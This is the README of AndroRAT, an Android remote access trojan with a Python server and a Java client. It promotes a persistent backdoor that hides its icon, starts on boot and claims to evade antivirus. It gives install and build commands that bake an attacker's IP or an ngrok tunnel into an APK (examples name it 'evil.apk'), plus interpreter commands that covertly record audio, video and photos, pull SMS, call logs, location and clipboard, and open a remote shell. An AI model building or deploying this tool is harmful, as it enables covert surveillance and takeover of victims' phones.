# AndroRAT
AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.

AndroRAT will work on device from Android 4.1 (Jelly Bean) to Android 9.0 (Oreo) (API 16 to API 28)

AndroRAT also works on Android 10 (Q) but some of the interpreter command will be unstable.

## Screnshot
![image](https://github.com/user-attachments/assets/c2049474-79d3-48e4-9fe5-15259440d6b6)

## Features of AndroRAT
- Full persistent backdoor
- Fully undetectable by any antivirus scanner [VirusTotal](https://www.virustotal.com/gui/file/e900b5d37ad8c8f79ca000b148253af04696a85fdfc245861cfb226dd86562df/detection) 
- Invisible icon on install
- Light weight apk which runs 24*7 in background
- App starts automatically on boot up
- Can record audio, video, take picture from both camera
- Browse call logs and SMS logs
- Get current location, sim card details ,ip, mac address of the device
 ## Prerequisites
AndroRAT requires Python3 and JAVA (or Android Studio)

## Installation
```
git clone https://github.com/karma9874/AndroRAT.git
cd AndroRAT
pip install -r requirements.txt
```
Note:
While cloning the repository using Git bash on Windows, you may get the following error:

``` error: unable to create file <filename>: Filename too long ```

This is because the Git has a limit of 4096 characters for a filename, except on Windows when Git is compiled with msys. It uses an older version of the Windows API and there's a limit of 260 characters for a filename.

You can circumvent this by setting core.longpaths to true.

``` git config --system core.longpaths true ```

You must run Git bash with administrator privileges.

## Usage (Windows and linux)
- To get the control panel of the app dial ``` *#*#1337#*#* ``` (For now it has only two options ``` Restart Activity``` and``` Uninstall```)
 ### Available Modes 
 - ```--build``` - for building the android apk
 - ```--ngrok``` - for using ngrok tunnel (over the internet)
 - ``` --shell ``` - getting an interactive shell of the device
   ```build mode``` mode
```
Usage:
  python3 androRAT.py --build --ngrok [flags]
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "karma.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```
```
    Usage:
  python3 androRAT.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```
Or you can manually build the apk by importing [Android code](https://github.com/karma9874/AndroRAT/commit/73c953d72cc3ab1f4863f667425d53089cb8bacf) folder to Android Studio and changing the IP address and port number in [config.java](https://github.com/Magma69-cyber/AndroRAT/commit/d140db34c83da4de85a951c0afd5e3c3d65d418d)file  and then you can generate the signed apk from ```Android -> Build -> Generate signed APK(s) ```
```shell ``` mode
```
Usage:
  python3 androRAT.py --shell [flags]
  Flags:
    -i, --ip                Listner IP address
    -p, --port              Listner port number
```
After running the ```shell `` mode you will get an interpreter of the device 
Commands which can run on the interpreter 
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
```
## Example 
- To build the apk using ngrok which will also set the listner:
  ``` python3 androRAT.py --build --ngrok -o evil.apk ```
-To build the apk using desired ip and port: ```python3 androRAT.py --build -i 192.169.x.x -p 8080 -o evil.apk ```
- To get the interpreter: ```python3 adnroRAT.py --shell -i 0.0.0.0 -p 8000 ```
## Interperter Examples 
- Generated APK
  ![image](https://github.com/user-attachments/assets/2f9b23d4-0c56-46b2-b7eb-b7ce1000aec2)
---------------------------------------------------------------------
- Some interpreter Commands
![image](https://github.com/user-attachments/assets/c073194e-0245-42ce-88e0-d1455a49037d)
--------------------------------------------------------------------
## Supporters:
![image](https://github.com/user-attachments/assets/dbf499ff-a140-43de-b02d-21a7babc2b2d)

## TODO
- Ngrok support
- Set up multi client
- Add screenshot command
## License
AndroRAT is licensed under MIT license take a look at the [LICENSE](https://github.com/Magma69-cyber/AndroRAT/blob/main/LICENSE)
for more information.

